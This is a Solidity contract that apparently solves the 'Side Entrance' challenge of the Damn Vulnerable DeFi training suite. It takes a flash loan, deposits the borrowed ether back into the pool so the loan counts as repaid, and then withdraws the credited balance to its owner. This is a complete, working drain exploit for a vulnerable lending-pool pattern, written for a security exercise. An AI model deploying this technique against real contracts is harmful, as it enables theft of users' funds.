// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanEtherReceiver is IFlashLoanEtherReceiver{
    SideEntranceLenderPool public immutable pool ;
    address public immutable owner;
    constructor (address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function execute() external override payable {
        pool.deposit{value: address(this).balance}();
        // pool.withdraw();
        // payable(owner).transfer(address(this).balance);
        
    }

    function flashloan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdraw() external {
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }
    
    receive () external payable {}
}
